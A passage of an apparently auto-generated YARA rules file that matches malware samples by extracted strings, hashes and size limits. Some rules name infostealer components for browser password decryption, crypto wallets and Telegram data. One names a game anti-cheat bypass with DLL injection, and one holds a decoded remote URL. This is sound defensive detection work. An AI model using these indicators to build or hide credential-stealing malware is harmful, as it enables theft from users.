      uint16(0) == 0x213c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_02b04677321d823fbe529a06e47a701e_imphash_ {
   meta:
      description = "_subset_batch - file 02b04677321d823fbe529a06e47a701e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c407e14578785bb299e8cf32937529d23da5023d0aceb50e63063c41317263ac"
   strings:
      $s1 = "The thread attempted to execute an instruction whose operation is not allowed in the current machine mode." fullword wide /* score: '26.00'*/
      $s2 = "WinBar.exe" fullword wide /* score: '22.00'*/
      $s3 = "The thread attempted to continue execution after a noncontinuable exception occurred." fullword wide /* score: '19.00'*/
      $s4 = "The thread attempted to read from or write to a virtual address for which it does not have the appropriate access." fullword wide /* score: '17.00'*/
      $s5 = "The thread attempted to access an array element that is out of bounds, and the underlying hardware supports bounds checking." fullword wide /* score: '17.00'*/
      $s6 = "WinBar - Error" fullword wide /* score: '15.00'*/
      $s7 = "|wwwwwwwwww" fullword ascii /* reversed goodware string 'wwwwwwwwww|' */ /* score: '14.00'*/
      $s8 = "The thread attempted to read or write data that is misaligned on hardware that does not provide alignment. For example, 16-bit v" wide /* score: '14.00'*/
      $s9 = "A trace trap or other single-instruction mechanism signaled that one instruction has been executed." fullword wide /* score: '14.00'*/
      $s10 = "The thread attempted to divide a floating-point value by a floating-point divisor of zero." fullword wide /* score: '14.00'*/
      $s11 = "The thread attempted to divide an integer value by an integer divisor of zero." fullword wide /* score: '14.00'*/
      $s12 = "WinBar - About" fullword wide /* score: '12.00'*/
      $s13 = "WinBar - " fullword wide /* score: '12.00'*/
      $s14 = "Select a language. The language will be saved in the profile. The language will be read from the default profile at startup. [li" wide /* score: '12.00'*/
      $s15 = "|}|||||" fullword ascii /* reversed goodware string '|||||}|' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_4c1fc10aff32912a1483ff882a457baf_imphash_ {
   meta:
      description = "_subset_batch - file 4c1fc10aff32912a1483ff882a457baf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "26b8e9af3705ca4bb7b6dad61114543c3f627831c957d0e2d15387f67919b3e0"
   strings:
      $s1 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '27.00'*/
      $s2 = "KernelBase.dll" fullword ascii /* score: '23.00'*/
      $s3 = "SEGetTotalExecTimeLeft" fullword ascii /* score: '21.00'*/
      $s4 = "SEGetExecTimeLeft" fullword ascii /* score: '21.00'*/
      $s5 = "SEGetExecTimeUsed" fullword ascii /* score: '21.00'*/
      $s6 = "SEGetNumExecLeft" fullword ascii /* score: '21.00'*/
      $s7 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '21.00'*/
      $s8 = "SEGetNumExecUsed" fullword ascii /* score: '21.00'*/
      $s9 = "SEGetTotalExecTimeUsed" fullword ascii /* score: '21.00'*/
      $s10 = "SECheckTotalExecTime" fullword ascii /* score: '16.00'*/
      $s11 = "SESetTotalExecTime" fullword ascii /* score: '16.00'*/
      $s12 = "SESetExecTime" fullword ascii /* score: '16.00'*/
      $s13 = "SECheckExecTime" fullword ascii /* score: '16.00'*/
      $s14 = "SESetNumExecUsed" fullword ascii /* score: '16.00'*/
      $s15 = "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters" fullword ascii /* score: '15.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule sig_506bf1c99658e9c038db830f6d34d32f4ffe2c5def1bfd4351a177001c4cec7d_506bf1c9 {
   meta:
      description = "_subset_batch - file 506bf1c99658e9c038db830f6d34d32f4ffe2c5def1bfd4351a177001c4cec7d_506bf1c9.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "506bf1c99658e9c038db830f6d34d32f4ffe2c5def1bfd4351a177001c4cec7d"
   strings:
      $s1 = "aaaaaaaaiiia" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_28ac7cd2ef7aff01e48b5edb1b01be41_imphash_ {
   meta:
      description = "_subset_batch - file 28ac7cd2ef7aff01e48b5edb1b01be41(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "389385bb19f008b4140697afaa8eb8dad7fde4354a08dcbe19163b3e0c949f02"
   strings:
      $s1 = "TCommonDialogX" fullword ascii /* score: '12.00'*/
      $s2 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s3 = "EComponentErrortwA" fullword ascii /* score: '10.00'*/
      $s4 = ";!;.;3;;;E;" fullword ascii /* score: '9.00'*/ /* hex encoded string '>' */
      $s5 = "OnGetSiteInfo`rA" fullword ascii /* score: '9.00'*/
      $s6 = "3 3+383=3" fullword ascii /* score: '9.00'*/ /* hex encoded string '383' */
      $s7 = "OnKeyDown0" fullword ascii /* score: '8.00'*/
      $s8 = "TConversion4" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_28ac7cd2ef7aff01e48b5edb1b01be41_imphash__4f69923a {
   meta:
      description = "_subset_batch - file 28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_4f69923a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4f69923a75ced5266718b463356a327727abab3f6b6afa40d4fb4db98ae9b972"
   strings:
      $s1 = "TCommonDialogX" fullword ascii /* score: '12.00'*/
      $s2 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s3 = "EComponentErrortwA" fullword ascii /* score: '10.00'*/
      $s4 = ";!;.;3;;;E;" fullword ascii /* score: '9.00'*/ /* hex encoded string '>' */
      $s5 = "OnGetSiteInfo`rA" fullword ascii /* score: '9.00'*/
      $s6 = "3 3+383=3" fullword ascii /* score: '9.00'*/ /* hex encoded string '383' */
      $s7 = "OnKeyDown0" fullword ascii /* score: '8.00'*/
      $s8 = "TConversion4" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule sig_55b6dece077975d89acf28ba84b04fcf_imphash_ {
   meta:
      description = "_subset_batch - file 55b6dece077975d89acf28ba84b04fcf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "cd1e92c890b877a806172d1ff9f927c6dc53b77a7d7642831f44c77f20bfa406"
   strings:
      $s1 = "TMSDOMProcessingInstruction" fullword ascii /* score: '15.00'*/
      $s2 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s3 = "get_internalSubset" fullword ascii /* score: '9.00'*/
      $s4 = "get_ownerElement" fullword ascii /* score: '9.00'*/
      $s5 = "* &]qH" fullword ascii /* score: '9.00'*/
      $s6 = "msxmldom" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule sig_55b6dece077975d89acf28ba84b04fcf_imphash__21709382 {
   meta:
      description = "_subset_batch - file 55b6dece077975d89acf28ba84b04fcf(imphash)_21709382.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "217093824fc9558d570214bbe6a519eea2de3512a533b4da25a5c5db682e36e9"
   strings:
      $s1 = "TMSDOMProcessingInstruction" fullword ascii /* score: '15.00'*/
      $s2 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s3 = "REjM.LaF.[pOy" fullword ascii /* score: '10.00'*/
      $s4 = "get_internalSubset" fullword ascii /* score: '9.00'*/
      $s5 = "get_ownerElement" fullword ascii /* score: '9.00'*/
      $s6 = "* &]qH" fullword ascii /* score: '9.00'*/
      $s7 = "G^k^tQ}EyEgIqEsD" fullword ascii /* score: '9.00'*/
      $s8 = "31]647] 4" fullword ascii /* score: '9.00'*/ /* hex encoded string '1dt' */
      $s9 = "oAkfpMgQp_w>LOgE`Dp p]qO^Z*QUV" fullword ascii /* score: '9.00'*/
      $s10 = "2(\\d3E\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '->' */
      $s11 = ":2_*::_2:\"_" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s12 = "{[}30\\->" fullword ascii /* score: '9.00'*/ /* hex encoded string '0' */
      $s13 = "+eViLeQb.lEzBa" fullword ascii /* score: '9.00'*/
      $s14 = "* ~VN,KH5" fullword ascii /* score: '9.00'*/
      $s15 = "msxmldom" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      8 of them
}

rule sig_651e57d4ccb1a3162fc07a2bd253eedd_imphash_ {
   meta:
      description = "_subset_batch - file 651e57d4ccb1a3162fc07a2bd253eedd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5dc83defd3f81f3eb45350e9f63722582fcea7e9edc8d5a911667a58cde9ae56"
   strings:
      $s1 = "TCommonDialog8" fullword ascii /* score: '13.00'*/
      $s2 = "=!=%=3=7=;=\\=|=" fullword ascii /* score: '9.00'*/ /* hex encoded string '7' */
      $s3 = "ContentType`" fullword ascii /* score: '9.00'*/
      $s4 = "TIdHeaderListd" fullword ascii /* score: '9.00'*/
      $s5 = ":$;3;B;^;" fullword ascii /* score: '9.00'*/ /* hex encoded string ';' */
      $s6 = "EVariantUnexpectedError4" fullword ascii /* score: '8.00'*/
      $s7 = "AutoHotkeys8" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule sig_1af6c885af093afc55142c2f1761dbe8_imphash_ {
   meta:
      description = "_subset_batch - file 1af6c885af093afc55142c2f1761dbe8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "36e0e1035885f9775f0e331707d691654bde8697a77b707098050022e1b812a6"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s3 = "Failed to get address for Tcl_FindExecutable" fullword ascii /* score: '27.00'*/
      $s4 = "  <assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"WdAppdataExclusion\" type=\"win32\"/>" fullword ascii /* score: '26.00'*/
      $s5 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s6 = "Failed to get address for Tcl_MutexLock" fullword ascii /* score: '23.00'*/
      $s7 = "Failed to get address for Tcl_MutexUnlock" fullword ascii /* score: '23.00'*/
      $s8 = "bpython311.dll" fullword ascii /* score: '23.00'*/
      $s9 = "7python311.dll" fullword ascii /* score: '23.00'*/
      $s10 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s11 = "LOADER: Failed to convert runtime-tmpdir to a wide string." fullword ascii /* score: '22.00'*/
      $s12 = "LOADER: Failed to obtain the absolute path of the runtime-tmpdir." fullword ascii /* score: '22.00'*/
      $s13 = "LOADER: Failed to expand environment variables in the runtime-tmpdir." fullword ascii /* score: '22.00'*/
      $s14 = "Failed to get address for PyConfig_Read" fullword ascii /* score: '21.00'*/
      $s15 = "multiprocessing.spawn)" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 27000KB and
      8 of them
}

rule sig_46e691d9b5d2c54a9f2d01538638df4d_imphash_ {
   meta:
      description = "_subset_batch - file 46e691d9b5d2c54a9f2d01538638df4d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "80b7c8193f287b332b0a3b17369eb7495d737b0e0b4e82c78a69fa587a6bcf91"
   strings:
      $s1 = "C:\\Users\\Public\\Music\\" fullword ascii /* score: '27.00'*/
      $s2 = " -d %appdata%" fullword ascii /* score: '26.00'*/
      $s3 = "C:\\ProgramData\\SHELL.txt" fullword ascii /* score: '22.00'*/
      $s4 = "ZhuDongFangYu.exe" fullword wide /* score: '22.00'*/
      $s5 = "VC19_IN_VM_Dll.dll" fullword ascii /* score: '17.00'*/
      $s6 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide /* score: '15.00'*/
      $s7 = "%s%s%X.tmp" fullword wide /* score: '15.00'*/
      $s8 = "HaHR0cDovL2tleTIwMjUub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9vdXRwdXQubG9n" fullword wide /* base64 encoded string 'http://key2025.oss-cn-hongkong.aliyuncs.com/output.log' */ /* score: '14.00'*/
      $s9 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword wide /* score: '13.00'*/
      $s10 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\filecore.cpp" fullword wide /* score: '13.00'*/
      $s11 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\ship\\atlmfc\\include\\afxwin1.inl" fullword wide /* score: '13.00'*/
      $s12 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\ship\\atlmfc\\include\\afxwin2.inl" fullword wide /* score: '13.00'*/
      $s13 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\winctrl2.cpp" fullword wide /* score: '13.00'*/
      $s14 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\viewcore.cpp" fullword wide /* score: '13.00'*/
      $s15 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\winfrm.cpp" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      8 of them
}

rule sig_7cd9ace011028659aaf6e472a34fa2b5fa845645eaf71184d6907540150d71b1_7cd9ace0 {
   meta:
      description = "_subset_batch - file 7cd9ace011028659aaf6e472a34fa2b5fa845645eaf71184d6907540150d71b1_7cd9ace0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7cd9ace011028659aaf6e472a34fa2b5fa845645eaf71184d6907540150d71b1"
   strings:
      $s1 = "tolerance.dll" fullword ascii /* score: '23.00'*/
      $s2 = "Fd3d9.dll" fullword ascii /* score: '20.00'*/
      $s3 = "                                val description = s 'res://mpvis.dll/RT_STRING/#100'" fullword ascii /* score: '17.00'*/
      $s4 = "                                val name = s 'res://mpvis.dll/RT_STRING/#100'" fullword ascii /* score: '11.00'*/
      $s5 = ".data$brc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule sig_07718e866ec58f7564b357c5141aff6b_imphash_ {
   meta:
      description = "_subset_batch - file 07718e866ec58f7564b357c5141aff6b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c8eaf6479a1d1e5c0fc06c4e5d688b0f04dfbcc4b34689369952fd34741b36c6"
   strings:
      $s1 = "Project1.exe" fullword ascii /* score: '22.00'*/
      $s2 = " requestedExecutionLevel " fullword ascii /* score: '16.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s4 = "Embarcadero RAD Studio 29.1 - Copyright 2024 Embarcadero Technologies, Inc." fullword ascii /* score: '15.00'*/
      $s5 = "V6.40:0009 -- Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." fullword ascii /* score: '14.00'*/
      $s6 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s7 = "**** Debug output: %s" fullword ascii /* score: '12.00'*/
      $s8 = "qbtfuWzkEyE" fullword ascii /* score: '12.00'*/
      $s9 = "#* <mwYruUZQB+R" fullword ascii /* score: '12.00'*/
      $s10 = "DRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEz" ascii /* score: '11.00'*/
      $s11 = "ufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxN" ascii /* score: '11.00'*/
      $s12 = "Ouk5Ly61xmyRDfzun8xzYqbtvtWzDDyEEeDmwYruZZQBl7oUk5Ly61xmyRDfzun8xzYqbtvtWzDDyEEeDmwYruZZQBl7oUk5Ly61xmyRDfzun8xzYqbtvtWzDDyEEeDm" ascii /* score: '11.00'*/
      $s13 = "y61xmyRDfzun8xzYqbtvtWzDDyEEeDmwYruZZQBl7oUk5Ly61xmyRDfzun8xzYqbtvtWzDDyEEeDmwYruZZQBl7oUk5Ly61xmyRDfzun8xzYqbtvtWzDDyEEeDmwYruZ" ascii /* score: '11.00'*/
      $s14 = "iOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6K" ascii /* score: '11.00'*/
      $s15 = "cDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEEzoSYOxNXYh2FniOEZhn8eI6KaERMcDRMfJPufEE" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule sig_4417249db25f76aa5ea9cf43e19a38de_imphash_ {
   meta:
      description = "_subset_batch - file 4417249db25f76aa5ea9cf43e19a38de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f01a7f4f87254ebc8074d962c06844cdb658c0f59bd06f3de2ac185703e88021"
   strings:
      $x1 = "processes.dll" fullword ascii /* score: '34.00'*/
      $s2 = "chrome_inject.exe" fullword ascii /* score: '29.00'*/
      $s3 = "password_formatter.dll" fullword ascii /* score: '28.00'*/
      $s4 = "\\chrome_inject.exe" fullword wide /* score: '26.00'*/
      $s5 = "WalletSorterDLL.dll" fullword ascii /* score: '23.00'*/
      $s6 = "steam_config_backup.dll" fullword ascii /* score: '23.00'*/
      $s7 = "DocumentGrabber.dll" fullword ascii /* score: '23.00'*/
      $s8 = "CookAutoFDllOpFire.dll" fullword ascii /* score: '23.00'*/
      $s9 = "info.dll" fullword ascii /* score: '23.00'*/
      $s10 = "FileZilla.dll" fullword ascii /* score: '23.00'*/
      $s11 = "software.dll" fullword ascii /* score: '23.00'*/
      $s12 = "screenshot.dll" fullword ascii /* score: '23.00'*/
      $s13 = "ExtentWallet.dll" fullword ascii /* score: '23.00'*/
      $s14 = "chrome_decrypt.dll" fullword ascii /* score: '22.00'*/
      $s15 = "telegram_data_mover.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_4d512dec8b02a8779f892ed6a07d6464625fd0ebce4ff1a0c1cb356784dd2d9c_4d512dec {
   meta:
      description = "_subset_batch - file 4d512dec8b02a8779f892ed6a07d6464625fd0ebce4ff1a0c1cb356784dd2d9c_4d512dec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4d512dec8b02a8779f892ed6a07d6464625fd0ebce4ff1a0c1cb356784dd2d9c"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "Failed to create remote thread for injected DLL" fullword ascii /* score: '28.00'*/
      $s3 = "vacbypass-log.txt" fullword ascii /* score: '27.00'*/
      $s4 = "steamservice.dll" fullword ascii /* score: '26.00'*/
      $s5 = "Full VAC Bypass and Cheat Injector by KittenPopo" fullword ascii /* score: '25.00'*/
      $s6 = "steamservice.exe" fullword ascii /* score: '25.00'*/
      $s7 = "Steam.exe" fullword ascii /* score: '22.00'*/
      $s8 = "csgo.exe" fullword ascii /* score: '22.00'*/
      $s9 = "Bypass injection patch cannot proceed." fullword ascii /* score: '21.00'*/
      $s10 = "Restart CSGhost to re-activate the VAC bypass." fullword ascii /* score: '20.00'*/
      $s11 = "tier0_s.dll" fullword ascii /* score: '20.00'*/
      $s12 = "@api-ms-win-core-synch-l1-2-0.dll" fullword wide /* score: '20.00'*/
      $s13 = "Select the DLL to inject" fullword ascii /* score: '19.00'*/
      $s14 = "SELECT DLL TO INJECT" fullword ascii /* score: '19.00'*/
      $s15 = "Failed to gain access to Steam's process." fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_34b686bac4c1bf52cfa5df1489257ea878d4d214cade5d2cdbdfa8e91a96cb65_34b686ba {
   meta:
      description = "_subset_batch - file 34b686bac4c1bf52cfa5df1489257ea878d4d214cade5d2cdbdfa8e91a96cb65_34b686ba.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "34b686bac4c1bf52cfa5df1489257ea878d4d214cade5d2cdbdfa8e91a96cb65"
   strings:
      $s1 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s2 = "            <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>" fullword ascii /* score: '11.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "vASC+ te" fullword ascii /* score: '8.00'*/
      $s6 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      all of them
}

rule sig_32f3282581436269b3a75b6675fe3e08_imphash__2b259170 {
   meta:
      description = "_subset_batch - file 32f3282581436269b3a75b6675fe3e08(imphash)_2b259170.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2b259170b74e332cba22dbf0919047767d4178081a0809161b7daa00b49085ad"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v3.42.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule sig_32f3282581436269b3a75b6675fe3e08_imphash__de4a1b26 {
   meta:
      description = "_subset_batch - file 32f3282581436269b3a75b6675fe3e08(imphash)_de4a1b26.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "de4a1b2694ac91d59a2533be3cfcf23e3e6afbcb17c6de13e40b255a8e4d85c3"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v9.86.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "trzS.Bkp" fullword ascii /* score: '10.00'*/
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s7 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule sig_32f3282581436269b3a75b6675fe3e08_imphash__f1af72e2 {
   meta:
      description = "_subset_batch - file 32f3282581436269b3a75b6675fe3e08(imphash)_f1af72e2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f1af72e204549494aad825cb5258f901d05f167e1892721255eae9b4da0ef1b6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.42.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule sig_17d1af981dee814dbe7b7466d29b1c57a55e613d0796398c7e1a579f60aed214_17d1af98 {
   meta:
      description = "_subset_batch - file 17d1af981dee814dbe7b7466d29b1c57a55e613d0796398c7e1a579f60aed214_17d1af98.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "17d1af981dee814dbe7b7466d29b1c57a55e613d0796398c7e1a579f60aed214"
   strings:
      $x1 = "System.Web.Configuration.ClientTargetSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword wide /* score: '43.00'*/
      $x2 = "System.CodeDom.Compiler.CodeDomConfigurationHandler, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword wide /* score: '39.00'*/
      $x3 = "C:\\Windows\\System32\\sechost.dll" fullword wide /* score: '39.00'*/
      $x4 = "System.Net.Configuration.SmtpSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword wide /* score: '38.00'*/
      $x5 = "System.Web.Configuration.HostingEnvironmentSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" wide /* score: '38.00'*/
      $x6 = "System.Web.Configuration.ProcessModelSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword wide /* score: '38.00'*/
      $x7 = "C:\\Windows\\System32\\USER32.dll" fullword wide /* score: '37.00'*/
      $x8 = "System.Xml.Serialization.Configuration.DateTimeSerializationSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToke" wide /* score: '37.00'*/
      $x9 = "System.Web.Configuration.SystemWebSectionGroup, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword wide /* score: '37.00'*/
      $x10 = "System.Web.Configuration.CompilationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword wide /* score: '37.00'*/
      $x11 = "System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToke" wide /* score: '37.00'*/
      $x12 = "System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856" wide /* score: '37.00'*/
      $x13 = "System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicK" wide /* score: '37.00'*/
      $x14 = "System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyTok" wide /* score: '37.00'*/
      $x15 = "System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyTo" wide /* score: '37.00'*/
   condition:
      uint16(0) == 0xbc60 and filesize < 8000KB and
      1 of ($x*)
}

